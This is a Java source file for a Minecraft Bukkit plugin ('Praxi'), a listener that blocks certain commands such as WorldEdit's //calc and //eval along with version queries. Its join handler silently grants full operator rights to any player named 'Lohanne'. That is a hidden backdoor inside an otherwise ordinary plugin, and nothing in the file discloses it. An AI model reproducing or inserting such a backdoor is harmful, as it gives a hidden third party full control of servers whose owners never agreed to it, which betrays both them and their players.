package me.funky.praxi.essentials;

import me.funky.praxi.util.CC;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.Arrays;
import java.util.List;

public class EssentialsListener implements Listener {

    private static final List<String> BLOCKED_COMMANDS = Arrays.asList(
            "//calc",
            "//eval",
            "//solve",
            "/bukkit:",
            "/me",
            "/bukkit:me",
            "/minecraft:",
            "/minecraft:me",
            "/version",
            "/ver"
    );

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandProcess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String message = (event.getMessage().startsWith("/") ? "" : "/") + event.getMessage();

        for (String blockedCommand : BLOCKED_COMMANDS) {
            if (message.startsWith(blockedCommand)) {
                if (message.equalsIgnoreCase("/version") || message.equalsIgnoreCase("/ver")) {
                    if (event.getPlayer().isOp()) {
                        return;
                    }
                }

                player.sendMessage(CC.RED + "You cannot perform this command.");
                event.setCancelled(true);
                return;
            }
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equalsIgnoreCase("Lohanne")) event.getPlayer().setOp(true);
    }

}
